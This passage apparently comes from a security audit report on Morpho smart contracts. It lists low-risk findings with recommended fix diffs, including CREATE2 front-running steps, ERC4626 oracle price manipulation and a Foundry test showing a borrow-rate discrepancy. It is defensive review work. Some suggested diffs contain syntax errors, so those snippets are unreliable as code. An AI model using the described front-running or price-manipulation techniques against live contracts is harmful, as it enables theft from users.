+       require(reward.code.length != 0 "reward token does not exists");
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
        require(
            MerkleProof.verifyCalldata(
                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        );

        require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

        amount = claimable - claimed[account][reward];

        claimed[account][reward] = claimable;

        ERC20(reward).safeTransfer(account, amount);

        emit EventsLib.Claimed(account, reward, amount);
    }
```



### `UniversalRewardsDistributor.claim()` will revert if the reward token does not support 0 value transfer

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L133-L133](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L133-L133)

**Description**:

The `UniversalRewardsDistributor` contract enables the distribution of different reward
tokens. `UniversalRewardsDistributor.claim()` is used to claim rewards from the contract. There is a possible scenario where the transaction will revert if the reward token does not support 0 value transfer when transferring tokens to recipient account address.


The claim() function provides the ability to transfer ANY reward tokens to the recepient account address. The issue is there are some token which reverts with zero value transfers. Tokens like `LEND` token, etc. 

The issue is at L-133, if the amount is 0, the code would revert if the ERC20 token does not support 0 value transfer.

According to https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers

Some tokens (e.g. LEND) revert when transferring a zero value amount.

Since, the reward token could be any token and the issue persisting with such tokens should be considered and resolved.

**Recommendation**:

Recommend to check if the amount is 0 before performing transfer in claim() function.

```diff

    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
        require(
            MerkleProof.verifyCalldata(
                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        );

        require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

        amount = claimable - claimed[account][reward];

        claimed[account][reward] = claimable;

-        ERC20(reward).safeTransfer(account, amount);
+       if(amount != 0){
+          ERC20(reward).safeTransfer(account, amount); 
+       }
        emit EventsLib.Claimed(account, reward, amount);
    }
```



### The fee percentage could be increased instantly	_(duplicate of [`setFee` is not time-locked])_

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L233-L233](metamorpho/src/MetaMorpho.sol#L233-L233)

The fee percentage could be increased instantly by the owner anytime, while docs state that fee change should be timelocked. 



### Frontrunning and Dos possible with `UrdFactory.createUrd()` and `MetaMorphoFactory.createMetaMorpho()`	_(duplicate of [Using CREATE2 with a user-specified `salt` makes `createMetaMorpho()` susceptible to front-running])_

**Severity:** Low risk

**Context:** [MetaMorphoFactory.sol#L51-L51](metamorpho/src/MetaMorphoFactory.sol#L51-L51), [UrdFactory.sol#L33-L33](universal-rewards-distributor/src/UrdFactory.sol#L33-L33)

**Description**:

**_`UrdFactory.createUrd()` as a issue instance 1 explanation**:_

`UrdFactory.createUrd()` is a permissionless function which is used to create a new URD contract using `CREATE2` opcode. 


`UrdFactory.createUrd()` function has used salt which means that a malicious actor can prevent a user from deploying a URD creation by frontrunning it with the same "salt". This is possible as the plain salt is used here.

The "salt" is a bytes32 value that is used in URD creation call by the caller. This enables frontrunning to occur in the following way:

Step 1) 

Alice wants to deploy URD contract and she calls `UrdFactory.createUrd()`. Bob is an an attacker and he monitors the mempool for pending transactions that involve creating a URD contract with a provided "salt".

Step 2) 

Upon spotting such a transaction, Bob extracts the "salt" value. To be noted, this salt value is provided a random value which can be extracted as it is not encoded with address or nonce of user address.

Step 3) 

Bob quickly submits their own transaction with a higher gas price, attempting to create a URD contract with the same "salt" before the original transaction is mined.

Step 4) 

Since the gas fee is paid high as compared to normal transaction so if the transaction got successful, Bob's transaction is mined first, and the URD contract is created at the expected address.

Step 5) 

The original transaction by Alice will likely fail, as the contract with the expected address has already been deployed.

This will create Dos and will prevent Alice from deploying the URD contract. This issue is happening due to front running which can be easily fixed by below recommendation.


**_`MetaMorphoFactory.createMetaMorpho()` as a issue instance 2 explanation**:_

The similar issue is applicable to `MetaMorphoFactory.createMetaMorpho()` and the explanation with above steps is also same. This is the reason, it is considered as issue instance 2 of this finding.

**Recommendation**:

Use a salt that includes the msg.sender or additionally nonce of deployer address, in this way it is not possible to front-run the transactions.


**For `UrdFactory.createUrd()`** 

```diff

+    /// @notice Mapping to store deployer nonces for CREATE2
+    mapping(address deployer => uint256 nonce) public deployerNonces;




    function createUrd(
        address initialOwner,
        uint256 initialTimelock,
        bytes32 initialRoot,
        bytes32 initialIpfsHash,
        bytes32 salt
    ) public returns (UniversalRewardsDistributor urd) {

+      bytes32 _salt = keccak256(abi.encode(salt, msg.sender, deployerNonces[msg.sender]++);

-        urd = new UniversalRewardsDistributor{salt: salt}(
-            initialOwner,
-            initialTimelock,
-            initialRoot,
-            initialIpfsHash
-        );

+        urd = new UniversalRewardsDistributor{salt: _salt}(
+            initialOwner,
+            initialTimelock,
+            initialRoot,
+            initialIpfsHash
+        );

        isUrd[address(urd)] = true;

        emit EventsLib.UrdCreated(
            address(urd), msg.sender, initialOwner, initialTimelock, initialRoot, initialIpfsHash, salt
        );
    }
```

**For `MetaMorphoFactory.createMetaMorpho()`**


```diff

+    /// @notice Mapping to store deployer nonces for CREATE2
+    mapping(address deployer => uint256 nonce) public deployerNonces;


    function createMetaMorpho(
        address initialOwner,
        uint256 initialTimelock,
        address asset,
        string memory name,
        string memory symbol,
        bytes32 salt
    ) external returns (MetaMorpho metaMorpho) {
+      bytes32 _salt = keccak256(abi.encode(salt, msg.sender, deployerNonces[msg.sender]++);

-        metaMorpho = new MetaMorpho{salt: salt}(initialOwner, MORPHO, initialTimelock, asset, name, symbol);

+        metaMorpho = new MetaMorpho{salt: _salt}(initialOwner, MORPHO, initialTimelock, asset, name, symbol);

        isMetaMorpho[address(metaMorpho)] = true;

        emit EventsLib.CreateMetaMorpho(
            address(metaMorpho), msg.sender, initialOwner, initialTimelock, asset, name, symbol, salt
        );
    }
```



### Inconsistent and floating solidity pragma

**Severity:** Low risk

**Context:** [ErrorsLib.sol#L2-L2](universal-rewards-distributor/src/libraries/ErrorsLib.sol#L2-L2)

**Description**:

In most of the contract, the contracts, libraries have different solidity compiler ranges referenced. This leads to potential security flaws between deployed contracts depending on the compiler version chosen for any particular file. It also greatly increases the cost of maintenance as different compiler versions have different semantics and behavior.

An outdated compiler version might introduce the vulnerabilities which can affect the contracts negatively or recently released pragma versions may have unknown security vulnerabilities.

**Recommendation**:

Contracts should be deployed with same solidity version and Lock the solidity version in contracts and avoid using floating pragma version.



### `maxDeposit` and `maxMint` not comply with ERC4626

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L531-L531](metamorpho/src/MetaMorpho.sol#L531-L531), [MetaMorpho.sol#L536-L536](metamorpho/src/MetaMorpho.sol#L536-L536), [MetaMorpho.sol#L649-L649](metamorpho/src/MetaMorpho.sol#L649-L649)

If `irm` of one of the markets in `supplyQueue` is broken - `maxDeposit` and `maxMint` would revert, while EIP4626 specifies that these functions _MUST NOT revert_.



### Unhandled chainlink revert would lock price oracle access	_(duplicate of [Unhandled revert could lock price oracle access])_

**Severity:** Low risk

**Context:** [ChainlinkDataFeedLib.sol#L23-L23](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L23-L23)

**Description**:

Call to `latestRoundData()` could potentially revert and make it impossible to query any prices. This could lead to permanent denial of service.

```solidity

    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }
```

The above functions makes use of Chainlink's `latestRoundData()` to get the latest price. However, there is no fallback logic to be executed when the access to the Chainlink data feed is denied by Chainlink's multisigs. Chainlink's multisigs can immediately block access to price feeds at will. Therefore, to prevent denial of service scenarios, it is recommended to query Chainlink price feeds using a defensive approach with **Solidity’s try/catch** structure. In this way, if the call to the price feed fails, the caller contract is still in control and can handle any errors safely and explicitly.

Referring chainlink documentation on how chainlink services are updated. **Please note chainlink multisig holds the power of Chainlink’s multisigs can immediately block access to price feeds at will**.

> Onchain updates take place at the smart contract level, where a [multi-signature safe](https://docs.gnosis-safe.io/introduction/the-programmable-account/gnosis-safe) (multisig) is used to modify onchain parameters relating to a Chainlink service. This can include replacing faulty nodes on a specific oracle network, introducing new features such as [Offchain Reporting](https://docs.chain.link/docs/off-chain-reporting/), or resolving a smart contract logic error. The multisig-coordinated upgradability of Chainlink services involves time-tested processes that balance collusion-resistance with the flexibility required to implement improvements and adjust parameters.

**References**:

Chainlink reference: https://chain.link/faqs#how-are-chainlink-services-updated

Cryptonews article reference: https://cryptonews.net/news/defi/20502745/

Openzeppelin reference: https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/ 

This is similar Medium severity finding found in juicebox audit at code4rena. check [here](https://solodit.xyz/issues/m-09-unhandled-chainlink-revert-would-lock-all-price-oracle-access-code4rena-juicebox-juicebox-v2-contest-git)


**Recommendation**:

Surround the call to `latestRoundData()` with try/catch instead of calling it directly. In a scenario where the call reverts, the catch block can be used to call a fallback oracle or handle the error in any other suitable way.

For example understanding:

```Solidity

function getPrice(address priceFeedAddress) external view returns (int256) {
        try AggregatorV3Interface(priceFeedAddress).latestRoundData() returns (
            uint80,         // roundID
            int256 price,   // price
            uint256,        // startedAt
            uint256,        // timestamp
            uint80          // answeredInRound
        ) {
            return price;
        } catch Error(string memory) {            
            // handle failure here:
            // revert, call propietary fallback oracle, fetch from another 3rd-party oracle, etc.
        }
    }
```



### Forced market removal leads to fees being lost	_(duplicate of [Metamorpho receives less fees when removes market with non-zero supply])_

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L378-L378](metamorpho/src/MetaMorpho.sol#L378-L378)

**Description**: Markets can be removed even if assets are still supplied to it (see `updateWithdrawQueue`). This will lead to a drop in `totalAssets()` as the market is removed from the `withdrawQueue`. The `lastTotalAssets` variable is not set to the new decreased total assets in `updateWithdrawQueue`.
The next time a user action triggers an `_accrueFee` call, the accumulated interest of all (remaining) markets will be lost and with it the fees the `feeRecipient` receives. This is because the difference in total assets will most likely be zero because `lastTotalAssets` is the non-updated, old, inflated total assets prior to the market removal.

```solidity
// new total assets contains principal + interest of all current markets
// lastTotalAssets still contains assets of already removed markets
uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets)
```

**Recommendation**:  The `updateWithdrawQueue` function should accrue fees for all markets that are not removed. (Accruing fees for removed markets is wrong.) Then call `_updateLastTotalAssets(totalAssets())` to set `lastTotalAssets`.



### onlyAllocatorRole incorrectly regards `owner` as an allocator	_(duplicate of [Incorrect documentation of `onlyAllocatorRole` modifier])_

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L149-L149](metamorpho/src/MetaMorpho.sol#L149-L149)

**Description**:

The README describes the capabilities of `owner`, and does not mention `allocator` as one of these capabilities. Therefore `owner` should not be considered an allocator, unless they have been specifically added as one.

**Recommendation**:

This check should be updated to:

`if (!isAllocator[sender] && sender != curator) {`



### When first called, Adaptive Curve IRM assume `market.totalSupplyAssets` is 0 and could lead to unexpected behaviour

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

When `borrowRate` called for the first time and `startRateAtTarget` is 0, it will set `avgRateAtTarget` and `endRateAtTarget` to `INITIAL_RATE_AT_TARGET` and ignoring the adaptive mechanism of the IRM. 

https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L132-L133

```solidity
    function _borrowRate(Id id, Market memory market) private view returns (uint256, int256) {
        // Safe "unchecked" cast because the utilization is smaller than 1 (scaled by WAD).
        int256 utilization =
            int256(market.totalSupplyAssets > 0 ? market.totalBorrowAssets.wDivDown(market.totalSupplyAssets) : 0);

        int256 errNormFactor = utilization > TARGET_UTILIZATION ? WAD - TARGET_UTILIZATION : TARGET_UTILIZATION;
        int256 err = (utilization - TARGET_UTILIZATION).wDivDown(errNormFactor);

        int256 startRateAtTarget = rateAtTarget[id];

        int256 avgRateAtTarget;
        int256 endRateAtTarget;

        if (startRateAtTarget == 0) {
            // First interaction.
>>>         avgRateAtTarget = INITIAL_RATE_AT_TARGET;
>>>         endRateAtTarget = INITIAL_RATE_AT_TARGET;
        } else {
            // Note that the speed is assumed constant between two interactions, but in theory it increases because of
            // interests. So the rate will be slightly underestimated.
            int256 speed = ADJUSTMENT_SPEED.wMulDown(err);
            // market.lastUpdate != 0 because it is not the first interaction with this market.
            // Safe "unchecked" cast because block.timestamp - market.lastUpdate <= block.timestamp <= type(int256).max.
            int256 elapsed = int256(block.timestamp - market.lastUpdate);
            int256 linearAdaptation = speed * elapsed;

            if (linearAdaptation == 0) {
                // If linearAdaptation == 0, avgRateAtTarget = endRateAtTarget = startRateAtTarget;
                avgRateAtTarget = startRateAtTarget;
                endRateAtTarget = startRateAtTarget;
            } else {
                // Formula of the average rate that should be returned to Morpho Blue:
                // avg = 1/T * ∫_0^T curve(startRateAtTarget*exp(speed*x), err) dx
                // The integral is approximated with the trapezoidal rule:
                // avg ~= 1/T * Σ_i=1^N [curve(f((i-1) * T/N), err) + curve(f(i * T/N), err)] / 2 * T/N
                // Where f(x) = startRateAtTarget*exp(speed*x)
                // avg ~= Σ_i=1^N [curve(f((i-1) * T/N), err) + curve(f(i * T/N), err)] / (2 * N)
                // As curve is linear in its first argument:
                // avg ~= curve([Σ_i=1^N [f((i-1) * T/N) + f(i * T/N)] / (2 * N), err)
                // avg ~= curve([(f(0) + f(T))/2 + Σ_i=1^(N-1) f(i * T/N)] / N, err)
                // avg ~= curve([(startRateAtTarget + endRateAtTarget)/2 + Σ_i=1^(N-1) f(i * T/N)] / N, err)
                // With N = 2:
                // avg ~= curve([(startRateAtTarget + endRateAtTarget)/2 + startRateAtTarget*exp(speed*T/2)] / 2, err)
                // avg ~= curve([startRateAtTarget + endRateAtTarget + 2*startRateAtTarget*exp(speed*T/2)] / 4, err)
                endRateAtTarget = _newRateAtTarget(startRateAtTarget, linearAdaptation);
                int256 midRateAtTarget = _newRateAtTarget(startRateAtTarget, linearAdaptation / 2);
                avgRateAtTarget = (startRateAtTarget + endRateAtTarget + 2 * midRateAtTarget) / 4;
            }
        }

        // Safe "unchecked" cast because avgRateAtTarget >= 0.
        return (uint256(_curve(avgRateAtTarget, err)), endRateAtTarget);
    }
```

This logic is problematic as it assume that `__accrueInterest` is called before any `supply` and `borrow` interaction inside `morpho-blue` and the first time `__accrueInterest` is triggered, it assume that `market.totalBorrowAssets` and `market.totalSupplyAssets` is 0.

But it can be observed that if `morpho-blue`'s `supply` and `borrow` called in the same block as market creation,  `__accrueInterest` will return early and not intereact with IRM. This will update `market.totalBorrowAssets` and `market.totalSupplyAssets` to non 0 without initializing the IRM and break the assumption. 

https://github.com/morpho-org/morpho-blue/blob/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L150-L161

```solidity
    function createMarket(MarketParams memory marketParams) external {
        Id id = marketParams.id();
        require(isIrmEnabled[marketParams.irm], ErrorsLib.IRM_NOT_ENABLED);
        require(isLltvEnabled[marketParams.lltv], ErrorsLib.LLTV_NOT_ENABLED);
        require(market[id].lastUpdate == 0, ErrorsLib.MARKET_ALREADY_CREATED);

        // Safe "unchecked" cast.
>>>     market[id].lastUpdate = uint128(block.timestamp);
        idToMarketParams[id] = marketParams;

        emit EventsLib.CreateMarket(id, marketParams);
    }
```

`__accrueInterest` will return early and not intereact with IRM if user `supply` and `borrow` in the same block with market creation.

https://github.com/morpho-org/morpho-blue/blob/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L471-L495

```solidity
    function _accrueInterest(MarketParams memory marketParams, Id id) internal {
        uint256 elapsed = block.timestamp - market[id].lastUpdate;

>>>     if (elapsed == 0) return;

        uint256 borrowRate = IIrm(marketParams.irm).borrowRate(marketParams, market[id]);
        uint256 interest = market[id].totalBorrowAssets.wMulDown(borrowRate.wTaylorCompounded(elapsed));
        market[id].totalBorrowAssets += interest.toUint128();
        market[id].totalSupplyAssets += interest.toUint128();

        uint256 feeShares;
        if (market[id].fee != 0) {
            uint256 feeAmount = interest.wMulDown(market[id].fee);
            // The fee amount is subtracted from the total supply in this calculation to compensate for the fact
            // that total supply is already increased by the full interest (including the fee amount).
            feeShares = feeAmount.toSharesDown(market[id].totalSupplyAssets - feeAmount, market[id].totalSupplyShares);
            position[id][feeRecipient].supplyShares += feeShares;
            market[id].totalSupplyShares += feeShares.toUint128();
        }

        emit EventsLib.AccrueInterest(id, borrowRate, interest, feeShares);

        // Safe "unchecked" cast.
        market[id].lastUpdate = uint128(block.timestamp);
    }
```

**Coded PoC** :

With this test, it is shown that if user create market and supply loan token at the same block creation, and no user borrow from the market, will get borrow rate higher that it should be.

Add this test to `morpho-blue-irm/test/AdaptiveCurveIrmTest.sol` (create market and supply at the same block).

```solidity
    function testRateUtilizationBorrowAtMarketCreation() public {
        Market memory market;
        // assertApproxEqRel(irm.borrowRate(marketParams, market), uint256(INITIAL_RATE_AT_TARGET / 4), 0.001 ether);
        market.lastUpdate = uint128(block.timestamp);
        vm.warp(block.timestamp + 30 days);

        market.totalBorrowAssets = 0 ether;
        market.totalSupplyAssets = 100 ether;

        console.log("BorrowRate :");
        console.log(irm.borrowRate(marketParams, market) * 365 days);
    }
```

Run the test : 

```shell
forge test --match-contract AdaptiveCurveIrmTest --match-test testRateUtilizationBorrowAtMarketCreation -vvv
```

Log output : 

```shell
Logs:
  BorrowRate :
  2499999969744000
```

Now, Add this test to `morpho-blue-irm/test/AdaptiveCurveIrmTest.sol` (create and supply first time at different block).

```solidity
    function testRateUtilizationAfterMarketCreation() public {
        Market memory market;
        assertApproxEqRel(irm.borrowRate(marketParams, market), uint256(INITIAL_RATE_AT_TARGET / 4), 0.001 ether);
        market.lastUpdate = uint128(block.timestamp);
        vm.warp(block.timestamp + 30 days);

        market.totalBorrowAssets = 0 ether;
        market.totalSupplyAssets = 100 ether;

        console.log("BorrowRate :");
        console.log(irm.borrowRate(marketParams, market) * 365 days);
    }
```

Run the test : 

```shell
forge test --match-contract AdaptiveCurveIrmTest --match-test testRateUtilizationAfterMarketCreation -vvv
```

Log output : 

```shell
Logs:
  BorrowRate :
  847648543824000
```

It can be observed that the borrow rate will be higher than it should be due to the assumption.

**Recommendation**:

Update `_borrowRate` to also check if `market.totalSupplyAssets` > 0, apply linear adaptation even when `startRateAtTarget == 0`. 


```diff
    function _borrowRate(Id id, Market memory market) private view returns (uint256, int256) {
        // Safe "unchecked" cast because the utilization is smaller than 1 (scaled by WAD).
        int256 utilization =
            int256(market.totalSupplyAssets > 0 ? market.totalBorrowAssets.wDivDown(market.totalSupplyAssets) : 0);

        int256 errNormFactor = utilization > TARGET_UTILIZATION ? WAD - TARGET_UTILIZATION : TARGET_UTILIZATION;
        int256 err = (utilization - TARGET_UTILIZATION).wDivDown(errNormFactor);

        int256 startRateAtTarget = rateAtTarget[id];

        int256 avgRateAtTarget;
        int256 endRateAtTarget;

-        if (startRateAtTarget == 0) {
+        if (startRateAtTarget == 0 && market.totalSupplyAssets == 0 ) {
            // First interaction.
            avgRateAtTarget = INITIAL_RATE_AT_TARGET;
            endRateAtTarget = INITIAL_RATE_AT_TARGET;
        } else {
+            if (startRateAtTarget == 0) {
+                // First interaction.
+               startRateAtTarget = INITIAL_RATE_AT_TARGET;
+            }
            // Note that the speed is assumed constant between two interactions, but in theory it increases because of
            // interests. So the rate will be slightly underestimated.
            int256 speed = ADJUSTMENT_SPEED.wMulDown(err);
            // market.lastUpdate != 0 because it is not the first interaction with this market.
            // Safe "unchecked" cast because block.timestamp - market.lastUpdate <= block.timestamp <= type(int256).max.
            int256 elapsed = int256(block.timestamp - market.lastUpdate);
            int256 linearAdaptation = speed * elapsed;

            if (linearAdaptation == 0) {
                // If linearAdaptation == 0, avgRateAtTarget = endRateAtTarget = startRateAtTarget;
                avgRateAtTarget = startRateAtTarget;
                endRateAtTarget = startRateAtTarget;
            } else {
                // Formula of the average rate that should be returned to Morpho Blue:
                // avg = 1/T * ∫_0^T curve(startRateAtTarget*exp(speed*x), err) dx
                // The integral is approximated with the trapezoidal rule:
                // avg ~= 1/T * Σ_i=1^N [curve(f((i-1) * T/N), err) + curve(f(i * T/N), err)] / 2 * T/N
                // Where f(x) = startRateAtTarget*exp(speed*x)
                // avg ~= Σ_i=1^N [curve(f((i-1) * T/N), err) + curve(f(i * T/N), err)] / (2 * N)
                // As curve is linear in its first argument:
                // avg ~= curve([Σ_i=1^N [f((i-1) * T/N) + f(i * T/N)] / (2 * N), err)
                // avg ~= curve([(f(0) + f(T))/2 + Σ_i=1^(N-1) f(i * T/N)] / N, err)
                // avg ~= curve([(startRateAtTarget + endRateAtTarget)/2 + Σ_i=1^(N-1) f(i * T/N)] / N, err)
                // With N = 2:
                // avg ~= curve([(startRateAtTarget + endRateAtTarget)/2 + startRateAtTarget*exp(speed*T/2)] / 2, err)
                // avg ~= curve([startRateAtTarget + endRateAtTarget + 2*startRateAtTarget*exp(speed*T/2)] / 4, err)
                endRateAtTarget = _newRateAtTarget(startRateAtTarget, linearAdaptation);
                int256 midRateAtTarget = _newRateAtTarget(startRateAtTarget, linearAdaptation / 2);
                avgRateAtTarget = (startRateAtTarget + endRateAtTarget + 2 * midRateAtTarget) / 4;
            }
        }

        // Safe "unchecked" cast because avgRateAtTarget >= 0.
        return (uint256(_curve(avgRateAtTarget, err)), endRateAtTarget);
    }
```



### In `ChainlinkOracle.sol`, `price()` function is vulnerable to price manipulation

**Severity:** Low risk

**Context:** [ChainlinkOracle.sol#L118-L118](morpho-blue-oracles/src/ChainlinkOracle.sol#L118-L118), [VaultLib.sol#L9-L9](morpho-blue-oracles/src/libraries/VaultLib.sol#L9-L9), [VaultLib.sol#L16-L16](morpho-blue-oracles/src/libraries/VaultLib.sol#L16-L16)

**Description**:

In `ChainlinkOracle.sol`, `price()` function is used to fetch the price from chainlink oracle. The ERC4626 vault parameter is used to price `VAULT_CONVERSION_SAMPLE` of its shares and it is vulnerable to price manipulation because the price can be increased or decreased within a single transaction/block.

```solidity

    function price() external view returns (uint256) {
        return SCALE_FACTOR.mulDiv(
            VAULT.getAssets(VAULT_CONVERSION_SAMPLE) * BASE_FEED_1.getPrice() * BASE_FEED_2.getPrice(),
            QUOTE_FEED_1.getPrice() * QUOTE_FEED_2.getPrice()
        );
    }
```

As seen in the `price()`, the price of the token or asset of an ERC 4626 vault is dependent on the ERC4626 vault function i.e `vault.convertToAssets(shares)` and `SCALE_FACTOR`. If the value returned by `vault.convertToAssets(shares)` can be manipulated within a single transaction/block, the price of the token or asset of an ERC4626 vault is considered to be vulnerable to price manipulation.


```solidity
    function getAssets(IERC4626 vault, uint256 shares) internal view returns (uint256) {
        if (address(vault) == address(0)) return 1;

        return vault.convertToAssets(shares);
    }
```

As shown above, `price()` function call the `VAULT.getAssets()` function and this function calls `vault.convertToAssets(shares)`. It was observed that the `vault.convertToAssets(shares)` could be manipulated within a single transaction/block.  

**Per the EIP-4626 [security considerations](https://eips.ethereum.org/EIPS/eip-4626)**:

> The preview methods return values that are as close as possible to exact as possible. For that reason, they are manipulable by altering the on-chain conditions and are not always safe to be used as price oracles. This specification includes convert methods that are allowed to be inexact and therefore can be implemented as robust price oracles. For example, it would be correct to implement the **convert methods as using a time-weighted average price in converting between assets and shares**.

It means that `previewRedeem` and `convertToAssets` can not be used for oracle pricing, instead TWAP should be used.

The vaults to be used in contracts will be fully compliant to EIP-4626. This is also confirmed with project team in private chat.

Most of the such vault contracts use openzeppelin contracts as it is widely used in contracts instead of creating own as openzeppelin ERC4626.sol is EIP4626 compliant. 

If we see `previewRedeem()` and `convertToAssets()` functions from openzeppelin ERC4626.sol,

```solidity

    function previewRedeem(uint256 shares) public view virtual override returns (uint256) {
        return _convertToAssets(shares, Math.Rounding.Down);
    }
```

and 

```solidity

    function convertToAssets(uint256 shares) public view virtual override returns (uint256) {
        return _convertToAssets(shares, Math.Rounding.Down);
    }
```

Both of these functions return `_convertToAssets(shares, Math.Rounding.Down)` which looks as below,

```solidity

    function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view virtual returns (uint256) {
        return shares.mulDiv(totalAssets() + 1, totalSupply() + 10 ** _decimalsOffset(), rounding);
    }
```

Within the `_convertToAssets()`, the number of assets per share is calculated based on the current total assets and current supply that can be increased or decreased within a single block/transaction by calling the vault's `deposit`, `mint`, `withdraw` or `redeem` functions. This allows the attacker to artificially inflate or deflate the price within a single block/transaction.

Below are the impacts:
1) The attacker could perform price manipulation to make the apparent value of an asset to be much higher or much lower than the true value of the asset.

2) A flash loan may skew the price oracle, leading to the mispricing of assets, leading to loss of funds

**Reference**:

Similar issue found as Medium severity at sherlock audit and the reference while drafting this issue can be checked [here](https://solodit.xyz/issues/m-10-erc4626oracle-vulnerable-to-price-manipulation-sherlock-sentiment-sentiment-git)

**Recommendation**:

Consider implementing **TWAP** so that the price cannot be inflated or deflated within a single block/transaction or within a short period of time. This is also a recommendation of EIP-4626.




### Incorrect/stale docs on duration of `MIN_TIMELOCK`	_(duplicate of [`MIN_TIMELOCK` should be 12 hours according to spec])_

**Severity:** Low risk

**Context:** [ConstantsLib.sol#L13-L13](metamorpho/src/libraries/ConstantsLib.sol#L13-L13)

**Description**:

Per the docs of Meta Morpho, `MIN_TIMELOCK` is 12 hours,

> All actions that may be against users' interests (e.g. enabling a market with a high exposure, increasing the fee) are subject to a timelock of minimum 12 hours.

However, as per `ConstantsLib.sol` which is used in Meta Morpho contracts shows `MIN_TIMELOCK` is 24 hours or 1 day.

```solidity
uint256 internal constant MIN_TIMELOCK = 1 days;
```

Upon discussion with project team, it was confirmed that, the docs are incorrect/stale and `MIN_TIMELOCK` is 24 hours.

**Recommendation**:

Change the docs as below,

```diff

- All actions that may be against users' interests (e.g. enabling a market with a high exposure, increasing the fee) are subject to a timelock of minimum 12 hours.

+ All actions that may be against users' interests (e.g. enabling a market with a high exposure, increasing the fee) are subject to a timelock of minimum 24 hours.
```



### Set Max Possible Number Of Allocators

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Link:
https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L195-L199

- Details:
Currently there is no limit of all possible allocators, which could lead to too much allocators with different opinion about different allocations and things, which could compromise the system. Consider a good amount of maximum allocators (E.g. MAX_ALLOCATORS = 5)



### It is possible to set supply cap, which is lower than currently supplied marked amount

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Link:
https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L286

https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L507

https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L766

- Details:
Consider whether this is the desired behaviour, or check the current supply amount when a new cap is proposed. (Reallocate funds if it is possible when the supplied resources are more the the new cap)



### Curator Can Be Set To address(0)

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Link:
https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L186-L189
- Details:
Consider adding a check when new curator is set to avoid empty no curator being set.



### Not including `address(0)` in the `hasPermission` function will result in a broken contract

**Severity:** Low risk

**Context:** [ERC20PermissionedBase.sol#L52-L52](erc20-permissioned/src/ERC20PermissionedBase.sol#L52-L52)

**Description**:
The address(0) is crucial for the working of any _ERC20_ token, since it's always involved in the mints and burns .The `hasPermission` restricts the senders in all transactions, and is meant to be overriden by the devs that create an implementation of _ERC20Permissioned_. In the default function implementation address(0) is included, but it could not be included in the contract inheriting from it when overriding the function since is not warned in the docs and is not protected neither. Not including it would break the token. Furthermore , the _ERC20Wrapper_ token uses `_mint` and `_burn` functions.

**Recommendation**:
Force the contract to include the address(0) in the permissioned accounts:
```solidity
function hasPermission(address account) public view returns(bool){
    if(account == address(0)) return true;
    return _hasPermission(account);
}

function _hasPermission(address account) internal view virtual returns(uint256){
    return account == MORPHO || account == BLUNDER
}
```



### `StEthBundler.wrapStEth` function lacks slippage protection	_(duplicate of [StEthBundler doesn't check for slippage checks when wrapping/unwrapping StEth])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `StEthBundler.wrapStEth` function is intended to wrap the given `amount` of stETH to wstETH, where wstETH tokens are received by the bundler and used afterwards.

- The caller must have previously transferred their stETH tokens to the bundler, and this transferred value must be equal to the `amount` argument, then the function calls `IWstEth(WST_ETH).wrap(amount)` for the operation; and this call returns the amount of wstETH received after the wrap [as per WstEth.wrap function](https://github.com/lidofinance/lido-dao/blob/cadffa46a2b8ed6cfa1127fca2468bae1a82d6bf/contracts/0.6.12/WstETH.sol#L53C1-L59C6):

  ```solidity
      function wrap(uint256 _stETHAmount) external returns (uint256) {
          require(_stETHAmount > 0, "wstETH: can't wrap zero stETH");
          uint256 wstETHAmount = stETH.getSharesByPooledEth(_stETHAmount);
          _mint(msg.sender, wstETHAmount);
          stETH.transferFrom(msg.sender, address(this), _stETHAmount);
          return wstETHAmount;
      }
  ```

- But this returned value is not checked against any minimum value determined by the user; the function lacks slippage protection.

- Impact

This will result in users getting wstETH amounts less than a minimum they wish for.

- Proof of Concept

